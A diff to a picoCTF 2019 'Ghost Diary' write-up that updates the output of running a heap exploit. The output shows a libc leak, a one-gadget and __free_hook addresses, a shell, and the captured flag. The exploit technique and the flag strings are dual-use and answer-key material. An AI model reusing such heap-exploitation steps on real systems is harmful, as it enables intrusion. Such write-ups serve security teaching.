@@ -886,26 +886,30 @@ p.interactive()
 
 Running the exploit now on the shell server gives us the flag:
 ```sh
-Faith@pico-2019-shell1:/problems/ghost-diary_3_79b47a93e884f13bbc2640b2e8606676$ python /tmp/Faith/ghost_diary/exploit.py
-[*] '/problems/ghost-diary_3_79b47a93e884f13bbc2640b2e8606676/ghostdiary'
+redacted@pico-2019-shell1:/problems/ghost-diary_4_e628b10cf58ea41692460c7ea1e05578$ python2 ~/exploit.py
+[*] Checking for new versions of pwntools
+    To disable this functionality, set the contents of /home/warlock/.pwntools-cache/update to 'never'.
+[*] You have the latest version of Pwntools (3.12.2)
+[*] '/problems/ghost-diary_4_e628b10cf58ea41692460c7ea1e05578/ghostdiary'
     Arch:     amd64-64-little
     RELRO:    Full RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      PIE enabled
-[+] Starting local process './ghostdiary': pid 811337
+[+] Starting local process './ghostdiary': pid 2346543
 [*] '/lib/x86_64-linux-gnu/libc.so.6'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      PIE enabled
-[*] Libc base: 0x7f3d6dba5000
-[*] one gadget: 0x7f3d6dbf4322
-[*] free_hook: 0x7f3d6df928e8
+[*] main arena leak: 0x7f0925653ca0
+[*] Libc base: 0x7f0925268000
+[*] one gadget: 0x7f09252b7322
+[*] free_hook: 0x7f09256558e8
 [*] Switching to interactive mode
 $ ls
 flag.txt  ghostdiary  ghostdiary.c
 $ cat flag.txt
-picoCTF{nu11_byt3_Gh05T_6c9ca015}$
+picoCTF{nu11_byt3_Gh05T_82783d57}$  
 ```
